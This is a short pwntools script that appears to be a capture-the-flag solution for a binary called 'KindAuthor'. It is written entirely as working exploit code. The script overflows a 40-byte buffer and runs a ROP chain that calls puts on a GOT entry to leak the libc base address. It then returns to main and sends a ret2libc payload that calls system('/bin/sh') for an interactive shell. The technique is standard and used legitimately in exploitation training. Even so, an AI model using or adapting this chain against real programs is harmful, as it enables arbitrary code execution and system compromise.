from pwn import *
context.binary=exe=ELF('./KindAuthor',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
p=process('./KindAuthor')

#leak libc
pop_rdi=0x000000000040114a
main=0x4011d1
payload=flat(
    b'a'*40,
    p64(pop_rdi),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(main)
)
p.sendlineafter(b'data:\n',payload)
libc.address=u64(p.recvline().strip().ljust(8, b"\x00"))-libc.sym['puts']
log.info(f"libc: {hex(libc.address)}")

#ret2libc
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b"/bin/sh"))

payload = flat(
    b'A'*40,
    pop_rdi, 
    binsh,
    ret,
    libc.sym['system']
)
p.sendlineafter(b'data:\n',payload)
p.interactive()
